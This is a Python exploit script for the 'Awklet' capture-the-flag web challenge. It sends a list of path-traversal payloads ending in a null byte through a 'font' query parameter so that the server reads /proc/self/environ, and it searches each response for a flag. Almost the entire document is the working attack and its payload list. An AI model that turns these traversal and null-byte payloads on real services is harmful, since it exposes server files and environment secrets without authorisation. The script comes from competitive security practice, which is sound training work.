#!/usr/bin/env python3
# Exploit Awklet by null-byte terminating the font path so the service reads /proc/self/environ.

from __future__ import annotations

import re
import urllib.parse
import urllib.request

BASE_URL = "https://awklet.challs.pwnoh.io/cgi-bin/awklet.awk"
TEXT = "Awklet"
FLAG_RE = re.compile(r"bctf\{[^}]+\}")

# The server appends ".txt" to whatever we pass as font. By embedding a URL-decoded
# null byte (`%00`) before ".txt", the C open() call stops at our chosen path,
# letting us read arbitrary files like /proc/self/environ.
PAYLOADS = [
    "/proc/self/environ%00",
    "../../proc/self/environ%00",
    "../../../proc/self/environ%00",
    "../../../../proc/self/environ%00",
]


# Format the request URL using the supplied font parameter.
def build_url(font_value: str) -> str:
    query = f"name={urllib.parse.quote(TEXT)}&font={font_value}"
    return f"{BASE_URL}?{query}"


# Send the payload and scan the response for the flag.
def fetch_flag(font_value: str) -> str | None:
    url = build_url(font_value)
    req = urllib.request.Request(url, headers={"User-Agent": "awklet-exploit/1.0"})
    with urllib.request.urlopen(req, timeout=10) as resp:
        body = resp.read().decode("utf-8", errors="replace")
    match = FLAG_RE.search(body)
    if match:
        print(f"[+] Flag found using font={font_value}: {match.group(0)}")
        return match.group(0)
    print(f"[-] No flag in response for font={font_value}")
    return None


# Loop through payloads until the flag is retrieved or all options are exhausted.
def main() -> int:
    for payload in PAYLOADS:
        flag = fetch_flag(payload)
        if flag:
            return 0
    print("[!] Failed to retrieve the flag; consider adding more payloads.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
